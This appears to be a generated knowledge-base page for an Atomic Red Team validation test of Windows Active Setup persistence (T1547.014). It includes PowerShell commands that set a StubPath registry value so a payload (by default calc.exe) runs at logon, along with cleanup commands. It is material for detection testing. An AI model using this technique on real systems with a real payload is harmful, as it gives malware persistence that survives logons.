---
atomic_guid: "39e417dd-4fed-4d9c-ae3a-ba433b4d0e9a"
title: "HKLM - Add malicious StubPath value to existing Active Setup Entry"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.014"
attack_technique_name: "Active Setup"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.014/T1547.014.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "39e417dd-4fed-4d9c-ae3a-ba433b4d0e9a"
  - "HKLM - Add malicious StubPath value to existing Active Setup Entry"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# HKLM - Add malicious StubPath value to existing Active Setup Entry

This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) 
Said key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. 
Without the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.

## Metadata

- Atomic GUID: 39e417dd-4fed-4d9c-ae3a-ba433b4d0e9a
- Technique: T1547.014: Active Setup
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1547.014/T1547.014.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547.014]]

## Input Arguments

### payload

- description: Payload to run once during login
- type: string
- default: C:\Windows\System32\calc.exe

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" "StubPath" "#{payload}" -Force
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
```

### Cleanup

```powershell
Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "StubPath" -Force
Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.014/T1547.014.yaml)
